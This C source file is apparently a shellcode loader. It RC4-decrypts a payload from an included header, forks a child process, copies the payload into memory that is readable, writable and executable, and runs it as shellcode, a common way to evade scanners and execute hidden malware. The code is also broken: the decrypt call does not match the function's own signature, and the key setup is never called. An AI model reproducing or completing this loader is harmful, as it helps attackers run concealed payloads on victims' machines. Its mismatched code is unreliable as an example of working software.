#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "encrypted_payload.h" // Contains the encrypted payload and key

void rc4_init(unsigned char *s, unsigned char *key, int key_length) {
    int i, j = 0;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key_length]) % 256;
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int data_length) {
    int i = 0, j = 0, k;
    unsigned char temp;

    for (k = 0; k < data_length; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}


int main() {

    // Fork the process
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    // Child process will handle decryption and shellcode execution
    if (pid == 0) {
        // Decrypt the payload
    	rc4_crypt(buf, BUF_SIZE, key, sizeof(key) - 1);

        // Allocate executable memory
        void *exec = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (exec == MAP_FAILED) {
            perror("mmap");
            exit(EXIT_FAILURE);
        }

        // Copy the decrypted payload to the executable memory
        memcpy(exec, buf, BUF_SIZE);

        // Create a function pointer to the shellcode
        void (*shellcode)() = exec;

        // Execute the shellcode
        shellcode();

        // After shellcode execution, exit child process
        exit(0);
    }


    return 0;
}


